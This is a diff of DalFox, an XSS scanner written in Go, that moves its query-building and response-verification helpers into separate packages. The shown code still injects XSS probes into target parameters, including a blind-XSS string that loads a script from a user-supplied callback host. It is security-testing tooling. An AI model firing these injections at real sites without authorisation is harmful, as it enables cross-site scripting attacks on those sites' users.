@@ -12,7 +12,9 @@ import (
 	"time"
 
 	"github.com/briandowns/spinner"
+	"github.com/hahwul/dalfox/pkg/optimization"
 	"github.com/hahwul/dalfox/pkg/printing"
+	"github.com/hahwul/dalfox/pkg/verification"
 )
 
 // Scan is main scanning function
@@ -94,8 +96,8 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 	if !options_bool["only-discovery"] {
 		// XSS Scanning
 
-		printing.DalLog("SYSTEM", "Generate XSS payload and Optimization.. 🛠")
-		// Optimization..
+		printing.DalLog("SYSTEM", "Generate XSS payload and optimization.Optimization.. 🛠")
+		// optimization.Optimization..
 
 		/*
 			k: parama name
@@ -107,7 +109,7 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 
 		arr := getCommonPayload()
 		for _, avv := range arr {
-			tq := MakePathQuery(target, avv)
+			tq := optimization.MakePathQuery(target, avv)
 			tm := map[string]string{"param": "pleasedonthaveanamelikethis_plz_plz"}
 			tm["type"] = "inPATH"
 			tm["payload"] = ";" + avv
@@ -131,8 +133,8 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 						// inJS XSS
 						arr := getInJsPayload()
 						for _, avv := range arr {
-							if Optimization(avv, badchars) {
-								tq := MakeRequestQuery(target, k, avv)
+							if optimization.Optimization(avv, badchars) {
+								tq := optimization.MakeRequestQuery(target, k, avv)
 								tm := map[string]string{"param": k}
 								tm["type"] = "inJS"
 								tm["payload"] = avv
@@ -143,8 +145,8 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 					if strings.Contains(av, "inATTR") {
 						arr := getAttrPayload()
 						for _, avv := range arr {
-							if Optimization(avv, badchars) {
-								tq := MakeRequestQuery(target, k, avv)
+							if optimization.Optimization(avv, badchars) {
+								tq := optimization.MakeRequestQuery(target, k, avv)
 								tm := map[string]string{"param": k}
 								tm["type"] = "inATTR"
 								tm["payload"] = avv
@@ -156,9 +158,9 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 					if strings.Contains(av, "inHTML") {
 						/*
 							arr := GetTags()
-							if Optimization("<", badchars) {
+							if optimization.Optimization("<", badchars) {
 								for _, avv := range arr {
-									tq := MakeRequestQuery(target, k, "/"+avv+"=1")
+									tq := optimization.MakeRequestQuery(target, k, "/"+avv+"=1")
 									tm := map[string]string{"param": k}
 									tm["type"] = "inHTML"
 									tm["payload"] = avv
@@ -170,8 +172,8 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 
 						arc := getCommonPayload()
 						for _, avv := range arc {
-							if Optimization(avv, badchars) {
-								tq := MakeRequestQuery(target, k, avv)
+							if optimization.Optimization(avv, badchars) {
+								tq := optimization.MakeRequestQuery(target, k, avv)
 								tm := map[string]string{"param": k}
 								tm["type"] = "inHTML"
 								tm["payload"] = avv
@@ -187,7 +189,7 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 			spu, _ := url.Parse(target)
 			spd := spu.Query()
 			for spk, _ := range spd {
-				tq := MakeRequestQuery(target, spk, "\"'><script src="+options_string["blind"]+"></script>")
+				tq := optimization.MakeRequestQuery(target, spk, "\"'><script src="+options_string["blind"]+"></script>")
 				tm := map[string]string{"param": spk}
 				tm["type"] = "toBlind"
 				tm["payload"] = "Blind"
@@ -363,7 +365,7 @@ func ParameterAnalysis(target string, options_string map[string]string) map[stri
 					temp_q := temp_url.Query()
 					temp_url.RawQuery = temp_q.Encode()
 				*/
-				temp_url := MakeRequestQuery(target, k, "DalFox")
+				temp_url := optimization.MakeRequestQuery(target, k, "DalFox")
 				var code string
 
 				//temp_url.RawQuery = temp_q.Encode()
@@ -391,22 +393,22 @@ func ParameterAnalysis(target string, options_string map[string]string) map[stri
 						smap = smap + "inJS[" + strconv.Itoa(ij) + "] "
 					}
 					ia := 0
-					temp_url := MakeRequestQuery(target, k, "\" id=dalfox \"")
+					temp_url := optimization.MakeRequestQuery(target, k, "\" id=dalfox \"")
 					_, _, vds, _ := SendReq(temp_url, "", options_string)
 					if vds {
 						ia = ia + 1
 					}
-					temp_url = MakeRequestQuery(target, k, "' id=dalfox '")
+					temp_url = optimization.MakeRequestQuery(target, k, "' id=dalfox '")
 					_, _, vds, _ = SendReq(temp_url, "", options_string)
 					if vds {
 						ia = ia + 1
 					}
-					temp_url = MakeRequestQuery(target, k, "' class=dalfox '")
+					temp_url = optimization.MakeRequestQuery(target, k, "' class=dalfox '")
 					_, _, vds, _ = SendReq(temp_url, "", options_string)
 					if vds {
 						ia = ia + 1
 					}
-					temp_url = MakeRequestQuery(target, k, "\" class=dalfox \"")
+					temp_url = optimization.MakeRequestQuery(target, k, "\" class=dalfox \"")
 					_, _, vds, _ = SendReq(temp_url, "", options_string)
 					if vds {
 						ia = ia + 1
@@ -437,7 +439,7 @@ func ParameterAnalysis(target string, options_string map[string]string) map[stri
 						*/
 						go func() {
 							defer wg.Done()
-							turl := MakeRequestQuery(target, k, "dalfox"+char)
+							turl := optimization.MakeRequestQuery(target, k, "dalfox"+char)
 							_, _, _, vrs := SendReq(turl, "dalfox"+char, options_string)
 							_ = resp
 							if vrs {
@@ -494,8 +496,8 @@ func SendReq(url, payload string, options_string map[string]string) (string, *ht
 	str := string(bytes)
 
 	defer resp.Body.Close()
-	vds := VerifyDOM(str)
-	vrs := VerifyReflection(str, payload)
+	vds := verification.VerifyDOM(str)
+	vrs := verification.VerifyReflection(str, payload)
 	return str, resp, vds, vrs
 }
 
